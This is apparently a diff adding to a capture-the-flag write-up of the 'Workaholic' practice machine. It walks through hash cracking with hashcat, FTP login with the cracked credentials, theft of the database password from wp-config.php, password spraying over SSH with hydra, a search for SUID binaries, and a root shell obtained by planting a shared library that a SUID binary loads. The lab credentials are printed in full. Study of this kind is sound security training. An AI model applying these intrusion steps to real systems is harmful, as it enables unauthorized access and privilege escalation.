@@ -71,3 +71,180 @@ echo '$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/' >> hashes
 hashcat -m 400 ./hashes /usr/share/wordlists/rockyou.txt #--show
 ```
 
+we only got nonadmin creds. hmmm hehe. probably by design
+
+```
+$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.:chrish20    : charlie
+$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/:okadamat17  : ted
+```
+
+so, we get `charlie:chrish20` and `ted:okadamat17` as creds. thanks to my laptop for the assist.
+
+now to ftp.
+
+`ted` works for ftp.
+
+```
+ftp ted@WORKAHOLIC
+okadamat17
+```
+
+we need to find out which file has credentials in it.
+
+> Further, the attacker retrieves database credentials from wp-config.php, leading to SSH access. Privilege escalation is achieved via an SUID binary vulnerable to shared object injection, granting full root control.
+
+
+so we need to steal `wp-config.php`.
+
+```php
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wpadmin' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+```
+
+neat.
+
+```
+ssh wpadmin@WORKAHOLIC
+rU)tJnTw5*ShDt4nOx
+```
+
+nope.
+let's try this
+
+```sh
+usernames.txt:
+
+ted
+wpadmin
+admin
+root
+charlie
+
+passwords.txt:
+
+rU)tJnTw5*ShDt4nOx
+
+hydra -L usernames -P passwords ssh://WORKAHOLIC
+
+# [22][ssh] host: WORKAHOLIC   login: charlie   password: rU)tJnTw5*ShDt4nOx
+
+```
+
+ssh cred is `charlie:rU)tJnTw5*ShDt4nOx`
+
+```
+
+ssh charlie@WORKAHOLIC
+rU)tJnTw5*ShDt4nOx
+```
+
+got user blood.
+
+time to find a suid binary.
+
+```
+find / -perm 400 -type f 2>/dev/null
+
+/var/lib/cloud/instances/iid-datasource-none/obj.pkl
+
+```
+okay. not useful.
+
+stealing a command from a guide...
+
+https://medium.com/@NullEsc/proving-grounds-practice-workaholic-ee1ffc500172
+
+```sh
+find / -perm -u=s -type f 2>/dev/null | grep -v snap
+
+
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/lib/openssh/ssh-keysign
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/var/www/html/wordpress/blog/wp-monitor
+
+```
+
+hmm, `/var/www/html/wordpress/blog/wp-monitor` seems interesting.
+
+then, 
+
+```sh
+# use this to find writeable directories 
+find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)' 
+
+/tmp
+/dev/shm
+/dev/mqueue
+/var/crash
+/var/tmp
+/var/lib/php/sessions
+    /home/ted
+    /home/charlie
+/home/charlie/.ssh
+/home/charlie/.cache
+
+```
+
+then,
+
+```sh
+strings /var/www/html/wordpress/blog/wp-monitor
+
+/var/log/nginx/access.log
+Error opening log file
+%s - - [%*[^]]] "%s %s %s" %s
+POST /wp-login.php
+[Warning] Possible brute force attack detected: %s
+[+] Checking the logs...
+/home/ted/.lib/libsecurity.so
+[!] This can take a while...
+init_plugin
+[!] Function not found in the library!
+9*3$"
+GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
+
+```
+
+
+`/home/ted/.lib/libsecurity.so` stands out.
+
+we need to make this file to trick the `wp-monitor` binary into loading it.
+
+
+```
+
+# (edit file and make dirs)
+
+gcc -fPIC -shared -o /home/ted/.lib/libsecurity.so /home/ted/.lib/libsecurity.c
+
+/var/www/html/wordpress/blog/wp-monitor
+```
+
+we have root shell.
